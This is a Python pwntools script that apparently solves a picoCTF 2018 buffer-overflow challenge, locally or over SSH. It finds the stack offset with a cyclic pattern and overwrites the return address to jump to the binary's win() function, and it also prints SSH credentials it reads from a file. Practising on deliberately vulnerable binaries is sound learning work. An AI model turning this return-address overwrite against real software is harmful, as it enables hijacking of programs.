from pwn import *
import json
LOCAL = True
CYCLIC_FOUND = True

if(LOCAL):
    bin = './vuln'
    elf = ELF(bin)
    p = process(bin)

else:
    hostname ="2018shell.picoctf.com"
    dir = '/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba'
    bin ='./vuln'
    with open("~/creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    elf = ELF(bin)
    p = s.process('sh')
    p.sendline('./vuln')

if(not CYCLIC_FOUND):
    payload = cyclic(100)
    print(p.recvline().decode())
    p.sendline(payload)
    print(p.recvall().decode())
    '''
    this problem prints out your return address, so once you run this
    you will be able to find what your offset needs to be by using
    cyclic_find() later with the return address that this function
    creates
    '''

main = elf.symbols['main']
win = elf.symbols['win']

number_of_offset_bytes = cyclic_find(0x6161616c)
payload = number_of_offset_bytes * "A"
payload += p32(win)

log.info("Main start: " + hex(main))
log.info("Win start: " + hex(win))
log.info("Offset size: %d" % number_of_offset_bytes)

print()
print(p.recvline().decode())
p.sendline(payload)
print(p.recv().decode())
